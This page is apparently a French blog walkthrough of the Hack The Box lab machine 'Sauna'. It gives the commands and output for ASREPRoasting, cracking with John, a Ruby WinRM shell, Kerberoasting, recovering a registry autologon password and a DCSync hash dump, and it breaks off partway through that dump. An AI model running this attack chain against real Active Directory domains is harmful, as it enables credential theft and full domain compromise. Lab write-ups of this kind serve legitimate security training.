@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.6" />
+
+    
+    
+    
+
+<title>Hack The Box - Sauna • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box - Sauna"/>
+<meta name="twitter:description" content="Sauna est une machine Windows considérée comme facile et orientée Active Directory. Le site web de l&rsquo;entreprise indique une liste potentielle d&rsquo;utilisateurs, permettant de réaliser un bruteforce au travers d&rsquo;une attaque ASRepRoasting. L&rsquo;obtention d&rsquo;un shell via WinRM permet par la suite d&rsquo;énumérer les propriétés du domaine et de trouver un mot de passe dans les clé de registre WinLogon. Cet utilisateur dispose des droits nécessaire (DCSync) pour dumper la base NTDS, ce qui permet de se connecter avec le hash NTLM de l&rsquo;administrateur."/>
+
+<meta property="og:title" content="Hack The Box - Sauna" />
+<meta property="og:description" content="Sauna est une machine Windows considérée comme facile et orientée Active Directory. Le site web de l&rsquo;entreprise indique une liste potentielle d&rsquo;utilisateurs, permettant de réaliser un bruteforce au travers d&rsquo;une attaque ASRepRoasting. L&rsquo;obtention d&rsquo;un shell via WinRM permet par la suite d&rsquo;énumérer les propriétés du domaine et de trouver un mot de passe dans les clé de registre WinLogon. Cet utilisateur dispose des droits nécessaire (DCSync) pour dumper la base NTDS, ce qui permet de se connecter avec le hash NTLM de l&rsquo;administrateur." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haax9.github.io/fr/walkthroughs/hackthebox/sauna/" />
+<meta property="article:published_time" content="2020-02-08T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2020-02-08T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haax9.github.io">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haax9.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/fr/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/about/">
+						<span>À Propos</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+		<li>
+			<a href="https://cheatsheet.haax.fr" target="_blank">Cheasheet</a>
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/fr/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/en/walkthroughs/hackthebox/sauna/" hreflang="en" lang="en" class="langLink">English</a>
+      <a rel="alternate" href="/en/walkthroughs/hackthebox/sauna/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2020 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Hack The Box - Sauna</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Feb 8, 2020
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 9 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>Sauna est une machine Windows considérée comme facile et orientée Active Directory. Le site web de l&rsquo;entreprise indique une liste potentielle d&rsquo;utilisateurs, permettant de réaliser un bruteforce au travers d&rsquo;une attaque ASRepRoasting. L&rsquo;obtention d&rsquo;un shell via WinRM permet par la suite d&rsquo;énumérer les propriétés du domaine et de trouver un mot de passe dans les clé de registre WinLogon. Cet utilisateur dispose des droits nécessaire (DCSync) pour dumper la base NTDS, ce qui permet de se connecter avec le hash NTLM de l&rsquo;administrateur.</p>
+
+<p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
+
+<h2 id="découverte-énumération">Découverte / Énumération</h2>
+
+<p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
+
+<pre><code class="language-bash">$ sudo nmap -sS -p 0-10000 -T4 -sV -sC default -O -v -oN scan_nmap 10.10.10.175
+
+Host is up (0.035s latency).
+Not shown: 9987 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-17 00:23:34Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</code></pre>
+
+<p>Le domaine est ainsi repéré et les différents services semblent indiquer que l&rsquo;on se trouve face à un contrôleur de domaine Active Directory. Il ne semble pas possible d&rsquo;interroger l&rsquo;Active Directory en tant qu&rsquo;utilisateur anonyme.</p>
+
+<p><strong>Note importante :</strong> Afin d&rsquo;éviter les problèmes de résolution DNS, ne pas oublier de renseigner les informations de la machine dans les fichiers <code>resolv.conf</code> et <code>hosts</code>.</p>
+
+<pre><code class="language-bash">$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 kalinux
+
+10.10.10.175 egotistical-bank.local
+</code></pre>
+
+<pre><code class="language-bash">$ cat /etc/resolv.conf 
+search egotistical-bank.local
+nameserver 10.10.10.175
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="potentiels-utilisateurs-et-asreproasting">Potentiels utilisateurs et ASRepRoasting</h2>
+
+<p>N&rsquo;ayant pas trouvé d&rsquo;autre point d&rsquo;entrée, on se tourne rapidement vers le site web de l&rsquo;entreprise. Quelques recherche sur la possible exploitation du serveur IIS ne donnent rien.
+Cependant, un élément intéressant attire notre attention. En effet, la page <code>about</code> de l&rsquo;entreprie mentionne plusieurs collaborateurs ainsi que la note suivante.</p>
+
+<pre><code class="language-bash">Meet the team. So many bank account managers but only one security manager. Sounds about right!
+</code></pre>
+
+<p>À partir de là, en pensant notre machine cible comme une vraie entreprise, il est possible d&rsquo;imaginer d&rsquo;éventuelles conventions de nommage pour des comptes utilisateurs de l&rsquo;Active Directory :</p>
+
+<pre><code>prenom.nom
+p.nom
+pnom
+nom
+</code></pre>
+
+<p>En partant de ce principe, nous sommes en mesure d&rsquo;établir une petite wordlist de comptes potentiels. J&rsquo;ai ensuite passé quelques minutes à tester des mots de passe triviaux pour tenter de trouver un accès, sans succès.</p>
+
+<p>C&rsquo;est là qu&rsquo;intervient une autre vulnérabilité, déjà exploitée auparavant, sur une autre box ;).
+Nommée &ldquo;ASRepRoasting&rdquo;, cette dernière se base sur la propriété &ldquo;Do not require Kerberos preauthentication&rdquo; d&rsquo;un compte et permet de récupérer un ticket au format KRB5ASREP, sans authentification préalable.</p>
+
+<p>La suite <code>impacket</code> propose un script permettant d&rsquo;automatiser cette demande.</p>
+
+<pre><code class="language-bash">$ python GetNPUsers.py egotistical-bank.local/ -usersfile ../../../../HackTheBox/Sauna/users.txt
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4f51424f1adb173550e06e8404dec4fe$98cac414702d5825e3ad4f4a5abfebe1fce96dfb8dd66d38e1184c67cda213c8b3c59d5a7f841d11b9589cd9c016355943d5fc729070494d50b9da512f509bc03329e682235af3e4599097d88ebab18bf395eb7d8aeb69b2cedb61a87d13aedcf6973a28a7bc09220386c39fa877dd93b3abe3da2ff9954fcbb7b1e35b4ac9565c5862d733b05cc8b0bf51e2e740bea0b709b5ed0bbd6022e7601ecbbf97cfbb7a521f62e7078962a5d84a4f81fc66a41981a6166194785090c07f9029cb1fabfd3575bacc0c84558f6d7950c91cc6c2a0e09ba19585b4d83ce6b953e0cd08de877d13abca6f39cac6d4d47024462dfb7d8a8d3a89637ee1ca6f1982cf395f39
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</code></pre>
+
+<p>Bingo ! le compte <code>fsmith</code> semble valide. Le ticket n&rsquo;est cependant pas utilisable en l&rsquo;état. En effet, il est nécessaire de casser ce dernier afin de retrouver le mot de passe en clair.
+<br/></p>
+
+<h2 id="passacracking-et-shell-user">Passacracking et shell user</h2>
+
+<p>Lancement d&rsquo;une petite session de passcracking, on sort <code>John</code> et on tente de casser le ticket avec une wordlist simple connue.</p>
+
+<pre><code class="language-bash">$ sudo john KRB5ASREP_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
+1g 0:00:00:22 DONE (2020-02-20 13:27) 0.04438g/s 467776p/s 467776c/s 467776C/s Thing..Thehunter22
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Le mot de passe du compte tombe relativement rapidement.</p>
+
+<pre><code class="language-bash">$ crackmapexec smb 10.10.10.175 -u fsmith -p 'Thestrokes23'                              
+CME          10.10.10.175:445 SAUNA           [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICALBANK)
+CME          10.10.10.175:445 SAUNA           [+] EGOTISTICALBANK\fsmith:Thestrokes23 
+[*] KTHXBYE!
+</code></pre>
+
+<p>Cependant, ce compte n&rsquo;est pas administrateur et les possibilités d&rsquo;exécution de commande à distance sont limitées.
+C&rsquo;est là qu&rsquo;intervient WinRM (Windows Remote Management). Il s&rsquo;agit d&rsquo;un service/protocole Microsoft HTTP, basé sur WS-Management (SOAP) qui permet l&rsquo;administration à distance de machines sous Windows.
+De retour à notre scan nmap, le port <strong>5985</strong>, utilisé par défaut par WinRM, est ouvert.</p>
+
+<p>Plusieurs façon d&rsquo;exploiter. J&rsquo;ai choisi d&rsquo;utiliser le script Ruby suivant.</p>
+
+<pre><code class="language-ruby">require 'winrm'
+
+conn = WinRM::Connection.new( 
+  endpoint: 'http://10.10.10.175:5985/wsman',
+  user: 'EGOTISTICAL-BANK\fsmith',
+  password: 'Thestrokes23',
+)
+
+command=&quot;&quot;
+
+conn.shell(:powershell) do |shell|
+    until command == &quot;exit\n&quot; do
+        print &quot;PS &gt; &quot;
+        command = gets        
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end    
+    puts &quot;Exiting with code #{output.exitcode}&quot;
+end
+
+</code></pre>
+
+<p>Ce qui donne un accès à la machine ainsi que le premier flag !</p>
+
+<pre><code class="language-bash">$ ruby winrm_shell.rb
+
+PS &gt; whoami
+egotisticalbank\fsmith
+
+PS &gt; pwd
+Path                     
+----                     
+C:\Users\FSmith\Documents
+
+PS &gt; ls ../Desktop 
+    Directory: C:\Users\FSmith\Desktop
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----              1/23/2020 10:03 AM    34     user.txt
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="énumération-1-2-et-kerberoasting">Énumération (&frac12;) et Kerberoasting</h2>
+
+<p>Ayant un accès à la machine et au domaine, la phase d&rsquo;énumération peut commencer.
+En repensant à la note vue auparavant, on se doute qu&rsquo;un compte utilisateur doit avoir certains droits (le compte &ldquo;security manager&rdquo;).</p>
+
+<p>Première étape donc, énumérer les comptes utilisateurs du domaine.</p>
+
+<pre><code class="language-bash">$ rpcclient -U 'EGOTISTICAL-BANK/fsmith' 10.10.10.175                                                    
+
+rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[HSmith] rid:[0x44f]
+user:[FSmith] rid:[0x451]
+user:[svc_loanmgr] rid:[0x454]
+</code></pre>
+
+<p>On observe la présence de 3 comptes, hors les comptes built-in nécessaires au domaine. Dans la mesure où nous controllons déjà <code>fsmith</code>, il ne reste que 2 cibles potentielles. Toutes les 2 ne faisant pas partie de la liste initiale des utilisateurs, il peut s&rsquo;agir du fameux compte de sécurité.</p>
+
+<p>Après quelques recherches, ìl s&rsquo;avère que le compte <code>hsmith</code> est utilisé comme compte de service. On peut notamment le voir grâce à <code>impacket</code>.</p>
+
+<pre><code class="language-bash">$ python GetUserSPNs.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon 
+----------------------------------------  ------  --------  --------------------------  ---------
+SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 06:54:34.140321  &lt;never&gt;   
+</code></pre>
+
+<p>On peut alors réaliser une attaque appelée &ldquo;Kerberoasting&rdquo;. Cette dernière consiste à demander un ticket (TGS) pour un compte de service utilisé. Il est par la suite nécessaire de casser ce ticket afin de pouvoir utiliser le compte.</p>
+
+<pre><code class="language-bash">$ python GetUserSPNs.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith -request
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon 
+----------------------------------------  ------  --------  --------------------------  ---------
+SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 06:54:34.140321  &lt;never&gt;   
+
+
+
+$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$SAUNA/HSmith.EGOTISTICALBANK.LOCAL~60111*$3f83e16fcf6121de6d5108bf7f5ca54e$2631853280dbc9343b504b32d3cb9c8c878a30ca9fe445b9f25e9f60b618137342062bf845ec776c30c851525d6e6cc44ff4097614405f8a8eaabb17f2297c6376ffb2b5b4e4d7caa98dea57d1e48e6c47da42936176773853e32a189239ba756ea1d1ac0db03d96ac6165610e747ff039f415c25dc7e5d9957c3783d417a4870a09b430e65f7b7f8d4994713e0cf3ceef3a76de873c265d17f100bc41e85a4fd718ac02aa1bed47a200ff5f1d53ada353105fe6dc551c05afcfa8c0478457385cd1241142d69a8134849ed2cd8d66b68e6438902ecaf3c58c227614e793bad77c149eb9086ce1c92a9b860c4f38adac25bc387b8e8fd49fbc2af925af1eb2183c126035a21312e09cdf464d7767d3c5c61fd070c3fce917758cdc75f2979c667d2d4c01f83ed52963e8fbe5c3cf9d7491aa9e77f3ec85edde2a8eeeab8fde6b6f5b2a66ef149384a1bb77e440d33e29ade5bf1c869f9819ecd55f6d5d97232d500a04cf242e0fecce881539d5e28339c68ac8f8631d56fdabc7c3b84ab392ff1e193ec4dcf8b8fa03e2b2e1d296d0c376b404e72a846ce97bd4a0054ee6e1973bdbe1f7596b883c847a3cf19691eda57aef877d078da2f3cfecb09afdded3d54e4113e43b353f98cc84649bc16c14e7c284fd691c8eb70ac0e4cb95be0661a142964b3945ef592934e9bc4dbcf1206347929aa6d58eec9b84f654b8d644e8ff1f85949047ab66277f89fb9fe1861d57560377299c51c163b721f22d1ee05264e7134eb6524505dec23d3afffdd98dd2c11afbf1b3ae0c119825e795ac742fdad06b593a8943e6d190c776ea8fa168eb647ee41a0bf87b0ce917e6b35bdfed79a298c2fed9137150819492e3784fb14e6e460869ab8fb95452c204df290354925d81ce7ace8c09e52593df3784c2d30821883a5da63098c5428893f02edfc3c09ce4d5fd1f9a5930e696720066082244dee437975243dcb0607ff653f148b0bf0513592142d1ff5fa9c3327977677a85c44821c11e81b0a0791d46f7d059984dcce8180187b9be01230571e6ae71693e463ceee020a7cf4eef64e4b6b837d9d8612b57f4915a0a4473e39a244d1a3e1bd0ac1b32190b7b0d14a26b8e54151fbb69c12581d9d992962be828f007c28fff4b8e5676a5384b7b56dfd195ad635ebfea43fb75f1954708d40bbe542f2684d8ceb7325cc248304b00e3140589d7e0cc95e6d3402f4ae15fde6edea85dfcd38229decbb35e4724907b875be249ed8ff5cd4e645e5d8c0db3de2192c593bc019c6f470a7d4d148c2cfbf7f2c50d0f2bf6bfa0805b93946106b361a1b614b0c5987eaec320cdf6e1cb58a1f793fd187246f395fb175d6a23bb1cc96cd1e5f39a7bee010f5cfd3a1aa9826526e0d73a22c69706a390e4
+</code></pre>
+
+<p>De la même façon que pour le précédent ticket (mais sous un autre format), on tente de le casser. On se rend rapidement compte que le compte <code>hsmith</code> utilise le même mot de passe que le compte <code>fsmith</code>.</p>
+
+<pre><code class="language-bash">$ crackmapexec smb 10.10.10.175 -u hsmith -p 'Thestrokes23'                             
+CME          10.10.10.175:445 SAUNA           [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICALBANK)
+CME          10.10.10.175:445 SAUNA           [+] EGOTISTICALBANK\hsmith:Thestrokes23 
+[*] KTHXBYE!
+</code></pre>
+
+<p>Cependant, on se rend également rapidement compte que cet utilisateur ne dispose pas de droits particulièrement intéressants pour nous&hellip;
+<br/></p>
+
+<h2 id="énumération-2-2-et-obtention-d-un-nouveau-compte">Énumération (2/2) et obtention d&rsquo;un nouveau compte</h2>
+
+<p>Dans la mesure où le second compte récupéré n&rsquo;aide pas à la compromission de la machine, on repart dans une seconde phase d&rsquo;énumération, cette fois ci orientée sur la machine et ses fichiers.</p>
+
+<p>Après quelques recherches classiques, des informations intéressantes peuvent être récupérées au niveau de la clé de registre <code>WinLogon</code>, et plus particulièrement le 3e compte utilisateur du domaine.</p>
+
+<pre><code class="language-bash">PS &gt; reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DefaultDomainName    REG_SZ    EGOTISTICALBANK
+    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ    
+    LegalNoticeText    REG_SZ    
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x8e3982368
+    ShutdownFlags    REG_DWORD    0x80000027
+    DisableLockWorkstation    REG_DWORD    0x0
+    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AlternateShells
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\UserDefaults
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\VolatileUserMgrKey
+</code></pre>
+
+<p>De la même façon que pour les autres comptes, on peut tester la validité du mot de passe identifié.</p>
+
+<pre><code class="language-bash">$ crackmapexec smb 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+CME          10.10.10.175:445 SAUNA           [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICALBANK)
+CME          10.10.10.175:445 SAUNA           [+] EGOTISTICALBANK\svc_loanmgr:Moneymakestheworldgoround! 
+[*] KTHXBYE!
+</code></pre>
+
+<p>Ok ! On dispose maintenant de tous les comptes utilisateurs du domaine, à l&rsquo;exception des comptes built-in et/ou privilégiés.
+<br/></p>
+
+<h2 id="dump-de-la-base-ntds-et-compromission">Dump de la base NTDS et compromission</h2>
+
+<p>Je passe la phase de recherche afin d&rsquo;arriver directement à la solution. La phase de reconnaissance peut être réalisée à l&rsquo;aide d&rsquo;outils tels que <code>BloodHound</code>, cela permet notamment d&rsquo;observer que le compte <code>svc_loanmgr</code> possède les droits DCSync !. Cela implique que le compte <code>svc_loanmgr</code> dispose des droits suffisants pour accéder à la base NTDS de l&rsquo;Active Directory.</p>
+
+<p>Ainsi, on peut par exemple extraire cette dernière à distance à l&rsquo;aide de <code>impacket</code>.</p>
+
+<pre><code class="language-bash">$ secretsdump.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175
+Impacket v0.9.21.dev1+20200220.181330.03cbe6e8 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:57e522d5738515b8a45d0d4d7b6546e2:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
+Administrator:des-cbc-md5:19d5f15d689b1ce5
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
